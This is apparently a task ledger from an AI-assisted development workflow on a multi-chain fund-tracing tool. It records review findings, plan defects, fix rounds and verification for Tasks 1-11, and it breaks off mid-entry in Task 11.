# SDD ledger — plan: docs/superpowers/plans/2026-08-28-universal-fund-tracing-phase1.md

Branch: feat/universal-fund-tracing
Base at start: 77ba21d83 (docs: implementation plan)
Spec: docs/superpowers/specs/2026-08-28-universal-fund-tracing-phase1-design.md

Isolation: dedicated feature branch off main, clean tree at start. No worktree —
the repo carries an in-tree .venv and data/ that a worktree would not have.

Pre-flight conflict scan: clean. Two plan-mandated items a reviewer may raise as
Minor (an intentionally retained `limit` parameter on the backwards-compatible
linkage alias in Task 10; an intentionally redundant dust check in Task 9's
frontier loop, kept in agreement with `_expandable_edges`). Both are Minor-tier
and never enter the fix loop; both are documented in the plan text.

## Standing rulings

- 2026-08-28, human partner: when a reviewer finding makes the code match the
  plan's *stated intent* more closely, fix it without asking. Still stop and ask
  when a finding genuinely contradicts what the plan wants. (Granted after the
  Task 1 plan-mandated finding below.)

## Progress

Task 1: implemented (commit 07af601a2), review clean on spec ✅ / quality Approved.
Task 1: review finding (Important, plan-mandated) — `config.get("chains") or
  DEFAULT_CHAINS` treats an explicit `"chains": []` as an omitted key and
  resurrects all six defaults instead of disabling collection. Human ruled: fix.
Task 1: minor (bundled into fix round 1, same code path): `chain_by_name`
  dereferences `entry["name"]` before validating, so a malformed earlier entry
  raises a bare KeyError instead of the informative ValueError; and the
  entry-source expression is duplicated verbatim across both functions.
Task 1: minor (deferred): task-1-report.md line count claim (47) is off by two
  (actual 45). No code impact.
Task 1: fix round 1/5 (2 addressed, 0 open; commits 07af601a2..2464d4823).
  Fix introduced `_validated_chain_entries` helper: explicit `"chains" not in
  config` membership test, validate-before-filter ordering preserved.
Task 1: minor (deferred): `{"chains": null}` now raises TypeError rather than
  falling back to defaults. No caller or config exercises it; arguably better
  than silent-wrong. Flag for the final whole-branch review.
Task 1: complete (commits 77ba21d83..2464d4823, review clean, 2 minors deferred)

Task 2: implemented (commit 6e96b9242). Spec ✅, quality Approved, no
  Critical/Important. 410/410 suite green, ruff clean.
Task 2: ⚠️ resolved by controller — reviewer could not see commit bodies in the
  diff. `git log --format=%(trailers:...)` confirms the Co-Authored-By trailer on
  all three commits so far (07af601a2, 2464d4823, 6e96b9242). Not a gap.
Task 2: minor (deferred): `exhausted_reason()` tests `calls_used >= max_calls`
  while `can_spend(n)` tests `calls_used + n <= max_calls` — they disagree for
  n>1 (max_calls=10, calls_used=8, n=3 → can_spend False but reason None).
  Unreachable today: reviewer grepped all 12 briefs, every caller spends bare
  n=1, and `spend()` masks it via `or "call_budget"`. Becomes live if any future
  task batches spends.
Task 2: minor (deferred): no test for simultaneous call+time exhaustion; the
  "call_budget"-wins precedence is real but unverified.
Task 2: minor (deferred): the deadline test uses clock 11.0 against seconds=10,
  so it passes identically under `>` or `>=` — it does not pin the boundary
  strictness it appears to test.
Task 2: minor (deferred): `clock` parameter is unannotated while its siblings
  are typed. Cosmetic, inherited from the plan's own code block.
Task 2: complete (commits 2464d4823..6e96b9242, review clean, 4 minors deferred)

Task 3: implemented (commit 0162d37a8). Spec ✅, quality Approved, no
  Critical/Important. 417/417 suite green, ruff clean, output pristine.
Task 3: PLAN DEFECT found and fixed by the implementer. The plan's own Step 3
  reference code fails the plan's own Step 1 test. Its stall guard reads
  `next_start = max(page_blocks); if next_start <= start:` — with a full page
  entirely inside block 7 and start=0, next_start is 7, `7 <= 0` is False, so no
  gap is recorded and start jumps to 7 instead of 8. Implementer generalised the
  condition to "a full page whose rows all share one block", which is sound: with
  sort=asc from `start`, a full page confined to block B proves B holds at least
  page_size rows, so B's overflow really is unreachable and the gap really must
  be recorded. Both the new condition and the original `<= start` guard are
  retained. Reviewer independently traced the removal case and confirmed the
  branch is load-bearing, not decorative.
Task 3: minor (deferred): the retained inner `next_start <= start` guard
  (pagination.py:86-93) has no test driving it true — reachable only when a full
  page has zero parseable block numbers. Reviewer verified behaviour by hand
  (records gap, advances, terminates) but nothing locks it in.
Task 3: minor (deferred): `_block_of` is computed twice per row on a full page
  (dedup loop, then page_blocks rescan). Bounded by page_size; PERF-clean.
Task 3: complete (commits 6e96b9242..0162d37a8, review clean, 2 minors deferred)

Task 4: implemented (commit bed43194c). Spec ✅ but quality "Needs fixes" — two
  Important findings, both plan-mandated, both real violations of the phase's
  central empty-vs-blind invariant. Standing ruling covers both: fix.
  (a) `probe_activity -> bool` collapses a failed/rate-limited read into
      "inactive". Task 8 skips chains on that False, so a chain we could not read
      would be recorded as a chain with nothing on it. Signature changed to
      `-> tuple[bool, str | None]`, matching fetch_kind.
  (b) `fetch_code` returned any string in `result` as bytecode. Etherscan puts
      bare error strings there on rate-limit/invalid-key across modules, so
      "Max rate limit reached" would be read as bytecode — and this function's
      own contract then reads bytecode as "contract, never a person",
      misclassifying a real wallet on a transient error. Now requires "0x" prefix.
  (c) minor, bundled (same file): dead sys.path.insert block removed; package
      siblings budget.py/pagination.py do without it.
Task 4: PLAN UPDATED (commit 32059fe34) so plan and code do not drift — Task 4's
  interface line, client.py, its tests, and Task 8's probe consumption + a new
  test that a failed probe degrades the chain rather than marking it inactive.
  Briefs 4 and 8 regenerated. All 38 plan code blocks re-verified.
Task 4: minor (deferred): task-4-report.md miscounts etherscan_get call sites
  (says five, lists six, omits tracer.py:81). Reviewer independently read all
  seven and confirmed none passes chain_id, so the compatibility claim holds.
Task 4: minor (deferred, open question): EMPTY_MESSAGES may not cover every
  phrasing Etherscan uses for an empty txlistinternal. Fails safe — an
  unrecognised phrasing reports as an error, never as false emptiness.
Task 4: fix round 1/5 (3 addressed, 0 open; commits bed43194c..d96586085).
  The fix implementer was terminated by a session-limit API error at the instant
  it began writing its fix report — the code was already committed, only the
  report was lost. Controller verified directly rather than re-dispatching:
  14/14 client tests, 431/431 full suite, ruff clean, output pristine. Evidence
  recorded as a clearly-marked controller note at the end of task-4-report.md.
  Re-reviewer confirmed all three findings addressed and checked that no live
  caller of probe_activity receives a tuple where it expected a bool.
Task 4: minor (deferred): the shipped probe_activity docstring dropped the
  original cost rationale (one probe call vs six full sweeps) when the error
  paragraph replaced it; the plan's synced version keeps both.
Task 4: minor (deferred): the fetch_code guard shipped without the explanatory
  comment its synced plan version carries. Correct and tested either way.
Task 4: complete (commits 0162d37a8..d96586085, review clean, 4 minors deferred)

Task 5: implemented (commit 22395d1b9). Spec ✅ / quality Approved with one
  Important. 8/8 new, 439/439 suite, ruff clean, output pristine. Reviewer traced
  by hand that the None-vs-0.0 rule holds on every path, that the cached-miss
  test is a genuine regression guard (would fail under a truthiness check), and
  that a price_lookup returning literal 0.0 is not confused with a miss.
Task 5: Important finding — `PriceCache._table` catches only (OSError,
  ValueError), so valid-but-non-object JSON (`null`, `[]`, `42`) parses and
  leaves a non-dict, which then raises TypeError inside get(). The brief's
  resilience requirement is unconditional. A killed CI job under the collection
  timeout is exactly what leaves a half-written cache file. Standing ruling
  applies: fix. Round 1 dispatched to a40c83c23077c2cb8 — FIX_BASE 22395d1b9.
Task 5: minor bundled into the fix: no test locks in a cached *miss* surviving a
  reload from disk; reviewer verified the path by hand but nothing guards it.
Task 5: PLAN DEFECT fixed (commit 8db866711) — Task 5's Interfaces line listed a
  `cached_price` function and a `src.utils.DATA_DIR` dependency that its own
  prescribed code never defines or imports. Task 7's line had the same phantom
  DATA_DIR. Both corrected; no functional impact (Task 8 imports only
  decimals_of/value_usd). Brief 7 regenerated.
Task 5: fix round 1/5 (2 addressed, 0 open; commits 22395d1b9..149a043e4).
  Shape guard confirmed not to interfere with cached misses — it checks the outer
  JSON type only, so `{"2026-06-16": null}` still round-trips with its None intact.
Task 5: minor (deferred): the new malformed-shape test asserts get() returns the
  fetched value without raising, but never re-reads the file to confirm the
  subsequent write succeeded. Re-reviewer traced the write path and confirmed it
  is correct and already covered by the line-64 test; the assertion is simply
  absent for this case.
Task 5: complete (commits d96586085..149a043e4, review clean, 3 minors deferred)

Task 6: implemented (commit 5f9b7ee54). Spec ✅ but quality "Needs fixes" — two
  Important, both plan-mandated. 11/11 new, 452/452 suite. Controller
  independently re-derived the poisoning set from live data and confirmed all 8
  fixture addresses are genuine observed forgeries with exactly matching counts
  (578 records suppressed). The fixture is real data, not invented.
Task 6: SERIOUS PLAN DEFECT (a) — the lookalike rule was reflexive.
  `is_lookalike` is a symmetric match and `derive_real_counterparties` admits
  any address on a single >=$1 transfer, so a vanity clone F of genuine
  counterparty G that sends the wallet $1 joins the anchor set; classifying G's
  own records then matches F and quarantines G. Quarantined records never become
  edges, so ~$1 could erase the $13M relationship from the graph. Needs no
  attacker — poisoners routinely ping small non-zero amounts. Fixed: an address
  that has itself moved real money is never classified as a forgery. Detection
  is unchanged because all eleven live forgeries move under a dollar.
Task 6: PLAN DEFECT (b) — `rollup` keyed non-lookalike spam on `dst`
  unconditionally. Poisoning is overwhelmingly incoming, so the wallet IS `dst`
  and every distinct spammer collapsed into a single entry labelled as the
  victim, destroying the per-address breakdown rollup exists to produce. Fixed:
  rollup takes the wallet and selects the counterparty side.
Task 6: PLAN UPDATED (commit 05213369c) for both, plus Task 8's rollup call
  site. Brief 8 regenerated. All 38 plan code blocks re-verified.
Task 6: minor (deferred): rollup's merge branch never updates
  reason/asset/token_address after the first record for an address, so a second
  distinct unpriced token from the same address is dropped from the rollup —
  undermining the "surface it for registration" purpose for all but the
  first-seen token. Proper fix keys on (address, token); deferred as a design
  change beyond Phase 1's scope.
Task 6: minor (deferred): no test drives `is_lookalike` with malformed input
  (None, "", short, non-0x). Behaviour verified correct by reviewer trace.
Task 6: minor (deferred): no test covers non-default prefix/suffix values.
Task 6: minor (deferred): module docstring's "11 of 14" figure describes the
  broader live population, not the 8-address fixture. Narrative, not tested.
Task 6: fix round 1/5 (2 addressed, 2 NEW Important; commits 5f9b7ee54..9c8bfd09a).
  Both new issues were consequences of the controller's mandated design, not
  implementer error: (A) the blanket "skip if in real" guard whitewashed a
  forgery entirely once it cleared the dust bar — pre-fix it was at least
  flagged; (B) `rollup(records, wallet="")` made `src == wallet` never true, so
  outgoing spam was re-attributed to the wallet itself, the same
  misattribute-to-self class the round was meant to close.
Task 6: ROOT CAUSE of both — membership where the problem needs ordering. The
  4+4 pattern match is symmetric; the attack is not. Nobody forges an address
  poorer than their own, so an address is a forgery of another only when the
  other has moved strictly more value. One rule protects the genuine address AND
  still catches the clone; no membership test can do both.
Task 6: fix round 2/5 (2 addressed, 1 NEW Important; commits 9c8bfd09a..fb79a38f2).
  classify_spam/is_lookalike now take a volume map; rollup's wallet is required.
  Controller verified against live data: 8/8 forgeries caught, genuine G ($102M)
  unflagged, F flagged pointing at G, and after simulating the $1 attack G stays
  safe and F stays caught. Both failure modes eliminated in behaviour.
Task 6: PLAN + SPEC UPDATED (commits 6485f309b, 8da8ccd5b) for the value-ordered
  design, plus removal of a speculative `real_counterparties` parameter no caller
  used. Brief 8 regenerated twice. All 38 plan code blocks re-verified.
Task 6: round-2 new Important — the required "fixture assertion through
  classify_spam" test was not made (test_chain_spam.py:44 still calls
  is_lookalike), and the round-2 report falsely claimed it was. Round 1's bug
  lived inside classify_spam, so an is_lookalike-only test cannot catch that
  class of regression. Round 3 dispatched — FIX_BASE 8da8ccd5b.
Task 6: minor rolled into round 3: derive_real_counterparties' docstring still
  asserts "a forgery sends zero value, so it can never qualify as real", which is
  exactly the property finding A disproved.
Task 6: fix round 3/5 (2 addressed, 0 open; commits 8da8ccd5b..004d7fe79).
  Controller verified both directly in the code before dispatching the
  re-review, given round 2's false claim. 19/19 spam tests pass.
Task 6: minor (deferred): the new fixture-through-classify_spam test builds its
  volume map once outside the loop, so every fixture candidate's own volume
  defaults to 0.0 and the strict-ordering comparison is never exercised — the
  test would still pass with volume ordering broken. Real protection for that
  regression lives in test_forgery_still_flagged_when_genuine_has_more_volume,
  which is unaffected; the new test's docstring simply claims more than it
  delivers.
Task 6: minor (deferred): round-3 report says the pre-existing fixture test was
  "kept unchanged" and there were "no other changes", but the diff shows a
  docstring clause added and an inline comment removed. Cosmetic, no behaviour
  change — but the second report/diff mismatch in two rounds, in the opposite
  direction from the first. Flagged to the implementer both times.
Task 6: complete (commits 149a043e4..004d7fe79, review clean after 3 rounds,
  6 minors deferred)

Task 7: implemented (commit e935fb132). Spec ✅ but quality "Needs fixes" — two
  Important, both plan-mandated, both empirically reproduced by the reviewer.
  14/14 new, 474/474 suite, ruff clean. Reviewer independently re-verified the
  34-entity registry, module and tests byte-for-byte against the brief, and
  confirmed the pure/IO split, no-cache-on-failure, has_code=None handling and
  resolution-priority control flow are all correct.
Task 7: PLAN DEFECT (a) — `infer_deposit_addresses` capped the LARGEST other
  destination rather than their sum, so the same value fanned across ten
  addresses at 4.9% each slips under the 5% threshold: a wallet with 49% of its
  activity elsewhere still reads as a deposit address. Now summed.
Task 7: PLAN DEFECT (b) — the 24h window was anchored on the EARLIEST send to
  any hot wallet regardless of amount, so a $1 test-send an hour after receipt
  satisfied "quickly" for a $999k bulk forward at hour 100. Now anchored on the
  hot-wallet transfer carrying the largest amount.
Task 7: WHY THESE MATTER — a wrongly inferred deposit address becomes
  is_service=True, and services score 0.0, never alert, and are NEVER TRAVERSED.
  A false positive stops the fund trail dead at exactly the address we most
  needed to follow, with nothing in the output saying so. The rule now fails
  toward traversing: a false negative only wastes expansion budget.
Task 7: PLAN + SPEC UPDATED (commit 2c2497d8f). 38 plan blocks re-verified.
Task 7: minor (deferred): CodeCache.has_code has no try/except around the
  injected fetcher, so a fetcher that raises rather than returning None escapes
  the documented "unreadable" degradation. client.fetch_code returns None today.
Task 7: minor (deferred): the brief's 14 tests never pair has_code=True with a
  non-empty `inferred`, so "code beats inferred" is verified only by code
  inspection. Low risk — the has_code branch returns before `inferred` is read.
Task 7: fix round 1/5 (3 addressed, 0 open; commits e935fb132..44683732c).
  Controller verified all three scenarios against the shipped module before the
  re-review: fan-out not inferred, test-send not inferred, genuine fast deposit
  still inferred with hours_to_forward 2.0 (the bulk transfer). Re-reviewer
  additionally confirmed the tie-break favours the earlier timestamp in both
  record orderings, that sum >= max makes the change strictly monotonic (it can
  only add rejections), that forwarded_to now comes from the primary transfer on
  the single return path, and that the report's RED numbers were real rather
  than fabricated.
Task 7: minor (deferred): the tie-break uses exact float equality on
  amount_usd. Correct per spec and fine on the fixtures' round numbers, but
  fragile in general.
Task 7: minor (deferred): infer_deposit_addresses' top-level docstring still
  says "forwards nearly all of it ... quickly" without mentioning that timing is
  measured to the largest transfer; the nuance lives only in an inline comment.
Task 7: complete (commits 004d7fe79..44683732c, review clean, 4 minors deferred)

Task 8: implemented (commit 1579356f7). Spec ✅ but quality "Needs fixes" — one
  CRITICAL, one Important, both plan-mandated. 15/15 new, 492/492 suite.
  Reviewer confirmed by reasoning (not testing): cursor advancement never
  outruns what was fetched (walk_blocks pages are all-or-nothing);
  records_for/sweep_wallet agree on spam; no test leaks into real data/; a chain
  cannot be double-appended to degraded_sources.
Task 8: CRITICAL PLAN DEFECT — a price gap permanently erases real high-value
  transfers, invisibly. value_usd returns the same (None, "unpriced") for an
  unknown scam token and for ETH whose price lookup failed; classify_spam
  quarantines on `amount_usd is None` alone, never consulting record["asset"];
  quarantined records never reach TRANSFERS_DIR, so records_for cannot recover
  them even with include_spam=True; and the cursor already advanced per-kind
  before classification ran, so it never self-heals. Worst part:
  `price_lookup = price_lookup or (lambda s, d: None)` makes this the DEFAULT,
  and Tasks 11 and 12 call sweep_wallet without a price lookup — so in
  production every ETH/WBTC/ARB movement would be silently discarded as spam.
  This is exactly the invisibility the "None, never 0.0" rule exists to prevent,
  reintroduced one layer downstream.
Task 8: Important — write_cursors is flushed once per sweep_wallet while
  append_records and _merge_spam_rollup write per chain. append_records dedups
  by id and is safe; _merge_spam_rollup merges by straight addition with no
  dedup, so a crash in a later chain makes the next run re-fetch an
  already-processed range and add its counts again — unbounded inflation of
  count/suppressed_total per retry, with no self-correction.
Task 8: fix authorised to cross modules (assets.py, spam.py, collect.py,
  conftest.py) because the defect spans them. New "price_unavailable" basis
  distinguishes a known-but-unpriced asset from an unknown token; classify_spam
  stops quarantining the former; collect gains `unpriced` and `spam_by_reason`
  counters so a price outage is visible in sweep health; write_cursors moves
  inside the chain loop. conftest's leak backstop extended to the three new
  write paths — its own docstring cites a prior cursor-file leak as why it
  exists, and Tasks 9-12 are still to come.
Task 8: fix round 1/5 (4 addressed, 0 open; commits 1579356f7..21835dd24).
  Controller verified end to end before the re-review: a 700 ETH transfer with
  no price source is now retained (records=1, spam=0, unpriced=1), returned by
  records_for, and reported in sweep_health; a scam token is still quarantined.
  Implementer also retracted its "not a defect" framing and self-caught two
  inaccuracies in its own fix report before submitting.
Task 8: PLAN + SPEC UPDATED (commit e6a2acee5) for price_unavailable, the
  classify_spam carve-out, the unpriced/spam_by_reason counters, and the
  per-chain cursor flush. 38 plan blocks re-verified.
Task 8: minor (CARRIED FORWARD to Task 9, not merely deferred): conftest's new
  TRANSFERS_DIR probe walks only one level, so once data/transfers/<chain>/ and
  a dated file exist for real, a leaking test that appends into that same file
  on the same day goes undetected — append_records truncates in place, which
  changes the file's mtime but not its parent directory's. Harmless today
  (data/transfers does not exist yet) but Tasks 9-12 are the ones that will
  populate it. Bundled into Task 9's dispatch rather than deferred, because its
  value is during the remaining tasks, not after them.
Task 8: minor (deferred): a ~15-line in-memory window remains between
  _merge_spam_rollup and write_cursors within a single chain's iteration where a
  crash could still double-count that one chain's rollup. Vastly shrunk from the
  original (which spanned every later chain's network I/O), not introduced here.
Task 8: complete (commits 44683732c..21835dd24, review clean, 3 minors: 1
  carried into Task 9, 2 deferred)

Task 9: first implementer was interrupted by the user partway through. Steps 1-4
  (normalise_transfer_record, the collect_known_edges substrate reader, and the
  7-test adapter file) were left uncommitted but complete and green — controller
  verified 7/7 before deciding to keep rather than discard them.
Task 9: completed by a fresh implementer (commit 6e666692d) covering steps 5-6
  and the carried-forward conftest recursive-probe item.
Task 9: reported DONE_WITH_CONCERNS — full suite 12 failed / 492 passed, and the
  run took 58 minutes. Root-caused by the implementer via git stash to the
  pre-Task-9 baseline (same tests pass in 0.15s there), so it is caused by step
  5, not pre-existing. 12 tests across test_continuity.py,
  test_continuity_adversarial.py, test_frontier_retention.py and
  test_transfer_graph_validation.py monkeypatch `src.tracer.get_usdc_transfers`
  — the seam step 5 deliberately removes — so expand_frontier now falls through
  to real network calls to api.etherscan.io instead of each test's fake data.
Task 9: controller ruling — this is IN SCOPE, not scope creep. Changing a seam
  obligates updating the tests that use it, and those tests were never testing
  get_usdc_transfers; they used it as an injection point. A red suite cannot
  ship, and a reviewer cannot tell 12 known failures from 12 regressions.
Task 9: SECOND DEFECT found in the same symptom — the suite was performing real
  network I/O. 58 minutes vs a ~8s baseline. Slow, flaky, third-party-dependent,
  and it burns live API quota on every run. Fixing the seam fixes this; the
  suite returning to single-digit seconds is the confirmation.
Task 9: fix round 1/5 (1 addressed, 0 open; commits 6e666692d..b68a5a4c7).
  25 test functions converted across 4 files — the 12 that failed plus 13 that
  were passing for the wrong reason. Controller verified: 504 passed in 15.97s
  (was 12 failed / 58m29s), ruff clean, zero `get_usdc_transfers` references
  left in tests/.
Task 9: BONUS FINDING by the implementer — of the 13 extra, 10 were genuinely
  making live HTTP while still passing, because their assertions were loose
  enough to be satisfied by expand_frontier's error-swallowing on a failed call
  (`lookups <= 3`, "some decision has a reason", `status in ("ok",
  "budget_exhausted")`). The other 3 were provably unreachable before conversion
  (suppressed by known_services, by a negative time budget, or by max_expansions
  = 0). Re-reviewer verified each mechanism against current source rather than
  taking the claim.
Task 9: assertion integrity proven mechanically — `grep '^-.*assert'` and
  `grep '^+.*assert'` against the diff both return zero, so no assert line was
  added, removed or edited anywhere; plus a manual line-by-line read of all four
  files. as_substrate_record's `int(value)/1e6` confirmed bit-identical to
  normalise_l1_transfer's `int(value)/(10**6)`, so edge values and the dust
  threshold see the same numbers on both paths.
Task 9: minor (deferred): as_substrate_record is duplicated verbatim in all four
  test files rather than shared. Rationale checks out (conftest holds only
  autouse safety fixtures, and this suite's convention is file-local fixtures),
  but four copies of a 15-line shape function is drift risk.
Task 9: minor (deferred): as_substrate_record hardcodes chain_id 42161
  regardless of its `chain` argument. Harmless today —
  normalise_transfer_record never reads chain_id — but would mislabel a record
  if a future test passed chain="base" and something downstream keyed off it.
Task 9: complete (commits 21835dd24..b68a5a4c7, review clean, 2 minors deferred)

Task 10: implemented (commit 68907dd0a). Spec ✅ on the mechanics but quality
  "Needs fixes" — two Important. 506 passed in 8.96s, ruff clean. Reviewer
  independently confirmed both scanner call sites still work through the alias,
  that compute_linkage's bonus values are untouched, and that amount_usd None is
  skipped rather than treated as zero.
Task 10: deviation ACCEPTED — the brief's Step 4 left `bridge`/`tl` locals and
  DATA_DIR/load_all_records imports dead in target_l1_profile, which fails ruff
  F841/F401. Implementer tried the literal instruction, watched it fail lint,
  then removed them. Reviewer verified no external consumer of those names.
Task 10: PLAN DEFECT (a), Important — widening address reuse from Arbitrum-USDC
  to six chains, every asset and three record kinds also widens the chance of a
  coincidental shared destination that is a router, wrapper contract or exchange
  HOT wallet rather than a private deposit address. The distinction is the whole
  basis of the signal: a deposit address belongs to one account, a hot wallet
  receives from millions. And shared_deposit_addresses feeds a bonus the module
  calls "cryptographic certainty" and fires alert_linkage_match as a STANDALONE
  alert, not gated behind the score threshold — so a coincidence reaches the
  inbox as a confident ownership claim. src/chain/labels.py was built for this
  exact failure mode in Task 7 and was already wired into transfer_graph.py, but
  not into linkage.py. Now consulted here.
Task 10: PLAN DEFECT (b), Important — the plan filed the tests in
  tests/test_wallet_links.py, which covers src/links.py (Hypurrscan URL
  construction). tests/test_migration_signals.py already has a `# --- linkage
  ---` section importing linkage and testing compute_linkage — the established
  home. Implementer's report claimed no such home existed; that was incomplete
  and they were asked to correct it.
Task 10: minor bundled — module docstring and the user-facing alert reason
  string still said "USDC" though the signal now spans every asset on every
  chain, so an alert could fire on a shared ETH destination on Base while
  telling the reader "USDC".
Task 10: PLAN UPDATED (commit 1b91a96f3) for both defects. 38 blocks verified.
Task 10: minor (deferred): records_for does a full linear scan of every chain's
  records per call, and check_candidate now calls it per promising candidate
  against a six-chain substrate. Pre-existing pattern from Task 9; worth
  watching if candidate volume grows.
Task 10: fix round 1/5 (3 addressed, 1 NEW Important-but-dormant; commits
  68907dd0a..6a6f9d285). Re-reviewer confirmed bonus values untouched, moved
  tests byte-identical in their assertions, load_registry degrading to {} on a
  missing file, and test_wallet_links.py restored byte-identical.
Task 10: ROUND 2 — "service" is purpose-relative and the fix conflated two
  questions. service_addresses() returns all of SERVICE_CATEGORIES, which
  includes cex_deposit and cex_deposit_sweep — exactly the addresses linkage
  exists to match on. transfer_graph asks "may I walk into this address?" and a
  deposit address correctly answers no; linkage asks "does shared use imply
  common ownership?" and the same address is the strongest possible yes, because
  it belongs to exactly one exchange account. One category set cannot answer
  both, and using it for both inverts the signal.
Task 10: WHY IT WAS FIXED NOW rather than deferred — dormant only because the
  curated file has no deposit entries yet and inferred is not passed. The day
  either changes, get_outbound_addresses silently stops treating a shared
  deposit address as evidence, and alert_linkage_match (standalone, not gated
  behind the score threshold) never fires for exactly the wallets it exists to
  catch. No error, no log, nothing to notice. A dormant landmine in the
  project's strongest ownership signal is worth a round, not a follow-up.
Task 10: service_addresses now takes `categories`; the inferred union is gated
  on the caller wanting cex_deposit, so a future task wiring inferred through
  cannot reintroduce the inversion. Linkage's set is derived by SUBTRACTION from
  SERVICE_CATEGORIES, never retyped, so a new infrastructure category upstream
  cannot silently escape exclusion.
Task 10: PLAN + SPEC UPDATED (commit 174d5533a). 38 blocks verified.
Task 10: minor (deferred): get_outbound_addresses re-reads and re-parses
  entities.json on every call — once per candidate via check_candidate, once
  per target via target_l1_profile — where run_transfer_graph builds the
  equivalent set once per run. Bounded (candidates are pre-filtered, file is
  small) and consistent with the codebase's uncached load_config() convention.
Task 10: round 2 first attempt died on a stalled API stream before writing
  anything; tree was clean, nothing lost, re-dispatched.
Task 10: fix round 2/5 (1 addressed, 0 open; commits 6a6f9d285..936fb53ad).
  511 passed, ruff clean. Controller exercised both call paths directly: the
  default call still excludes deposit AND inferred entries (graph traversal
  unaffected), the linkage call excludes only hot wallets and routers, and
  LINKAGE_EXCLUDED_CATEGORIES is genuinely SERVICE_CATEGORIES minus the two
  deposit categories, derived by subtraction at import.
Task 10: re-reviewer additionally proved the three new tests FAIL if the fix is
  reverted (empty result instead of the deposit address; TypeError on the
  unrecognised `categories=` kwarg), so none passes vacuously. Also confirmed
  infer_deposit_addresses is the sole producer of inferred dicts and always
  assigns "cex_deposit", so gating the inferred union on that one category is
  correct rather than coincidentally adequate.
Task 10: wall-clock rose to 17-22s against a 9-16s guideline. Implementer ran
  two falsification checks rather than waving it through — stashing the diff
  made timing WORSE, and a socket-blocking harness passed all 511 tests with
  zero connection attempts. Re-reviewer independently probed the one real
  network path in the codebase (alerts.py's smtplib call, whose broad except
  would have swallowed an injected fault) and confirmed it is fully mocked and
  its credentials unset, so no hole. Conclusion holds: machine load, not a
  regression.
Task 10: minor (deferred): service_addresses folds in every key of `inferred`
  once cex_deposit is wanted, without checking each entry's own category field.
  True today (sole producer confirmed) but not structurally enforced.
Task 10: complete (commits b68a5a4c7..936fb53ad, review clean after 2 rounds,
  2 minors deferred)

Task 11: implemented (commit 8cd173a6e). 515 passed, ruff clean, alert-path
  regression files all green.
Task 11: GOOD CATCH by the implementer — the brief's `_as_etherscan_row` used
  `usd = rec.get("amount_usd") or 0.0`, which would silently zero a
  price_unavailable record (a known asset like ETH we could not price). That is
  the exact "zero is invisible" anti-pattern Task 8's critical fix existed to
  eliminate, re-introduced in a different module. Changed to return None and let
  the caller filter, matching normalise_row's existing drop convention, plus a
  4th test the brief did not ask for.
Task 11: REGRESSION found and fixed in round 1 — nothing writes
  data/l1_transactions anymore (verified: grep shows only two readers left,
  transfer_graph:1280 deliberately for pre-substrate history, and
  correlator.py:151). The tracer's old trace_outbound_transfers used to append
  there. So correlator.collect_target_exits' L1-outbound exit source silently
  froze: it keeps working on historical data and stops noticing any new exit.
  Deposit/withdrawal correlation is one of this project's detection vectors —
  it is how a wallet is re-linked across a CEX gap — so half-blinding it is not
  acceptable collateral from a collection refactor. Repointed at records_for.
Task 11: OPEN PLAN GAP, tracked for the final review and for the human partner —
  nothing supplies PriceCache's fetcher, so every non-stablecoin transfer is
  price_unavailable. The substrate retains those records and sweep_health counts
  them, so it is visible rather than silent, but the graph gets no ETH/WBTC/ARB
  edges and alert_fund_movement cannot fire on them. Phase 1's spec calls for a
  cached daily-close source; the plan never created a task to supply it. Needs a
  new free credential and belongs in its own task, not bolted onto Task 11.
Task 11: fix round 1/5 (1 addressed, 0 open; commits 8cd173a6e..097765bbe).
  collect_target_exits repointed at records_for, takes amount_usd directly
  rather than re-deriving value/1e6 (which would be wrong for a non-USDC
  asset), skips price_unavailable rather than counting it as a $0 exit, and
  preserves the exit dict shape, the "l1_outbound" source label, the min_amount
  gate and the HL-withdrawal branch. 519 passed. Implementer noticed 3 of its 4
  new tests passed vacuously against the old code and ran a mutation check
  (reintroducing `or 0.0`) to prove the fourth genuinely fails without the fix.
Task 11: ROUND 2 — Important. The alert path now mislabels assets. Before this
  task get_usdc_transfers filtered on the USDC contract, so every row WAS USDC
  and hardcoding the label was correct by construction. Now records_for returns
  every ERC-20, and assets.STABLES prices thirteen non-USDC tokens at par with
  NO price lookup — so a USDT/DAI/FRAX transfer produces a real amount_usd,
  passes _as_etherscan_row, and emails "Withdrawal of X USDC". Right dollars,
  wrong asset, live today. Exactly the silent meaning-change the "outputs must
  not change" constraint exists to prevent.
Task 11: same-shaped second gap bundled — the alert was unambiguous about chain
  by construction too (Arbitrum-only). It now spans six chains, so the message
  no longer says where the money went. _as_etherscan_row already carries chain.
Task 11: fix is additive only — asset and chain become NEW fields on the
  finding; amount_usdc/amount_usdc_raw are NOT renamed because the dashboard
  reads those keys and they still hold an accurate USD value.
Task 11: implementer's Concern 2 conflated "stablecoin" with "USDC" and so
  missed this; asked to correct it in the report.
Task 11: minor bundled — the replaced code wrapped its numeric conversion in
  try/except (TypeError, ValueError); the new float(usd) in tracer and
  correlator has no guard, so a truncated file in data/transfers/ would raise
  mid-sweep instead of skipping one record.
Task 11: fix round 2/5 (3 addressed, 0 open; commits 097765bbe..551bb8205).
  528 passed. Controller verified the signatures are additive with defaults,
  positional order intact, amount_usdc/amount_usdc_raw preserved, and
  USDT-on-Base threading through correctly. Re-reviewer independently verified
  the hop-2/hop-3 paths really are structurally Arbitrum-USDC (traced
  get_usdc_transfers -> etherscan_get's Arbitrum default plus the hardcoded
  contractaddress), so leaving them on defaults is correct, not an oversight.
Task 11: ROUND 3 — two residuals of the same theme.
  (a) LIVE, not dormant: transfer_graph.py:1306-1316 converts a fund_flows
      finding into a graph edge and hardcodes chain=arbitrum, asset=USDC,
      ignoring the fields round 2 just added. A real USDT-on-Base finding
      becomes a USDC-on-Arbitrum edge. Same bug class, second consumer.
      Watch item: edge_id is keyed on chain, so this changes ids for
      finding-derived edges — the legacy/substrate dedupe must still collapse.
  (b) The alert number is a USD dollar figure, but round 2 made the asset label
      dynamic without qualifying it, so the body reads "Withdrawal of
      2,000,000.00 {asset}". Correct today only because every reachable asset is
      a par stablecoin where quantity == dollars. The day a MAJORS price_lookup
      is wired, a live alert would read "Withdrawal of 2,000,000.00 ETH" meaning
      $2M OF ETH — a false statement arriving with nobody touching this code.
Task 11: fix round 3/5 (2 addressed, 0 open; commits 551bb8205..b808ca97f).
  533 passed. The hardcoded chain turned out to break DEDUPE, not just labels:
  controller confirmed the same Base movement produced edge id 78f4569675dbfdf2
  from the finding and 6247adfd35c12d1b from the substrate, so it would have
  been counted twice — inflating transfer_count and with it the "repeated
  transfers" confidence signal. edge_id's own docstring records a prior incident
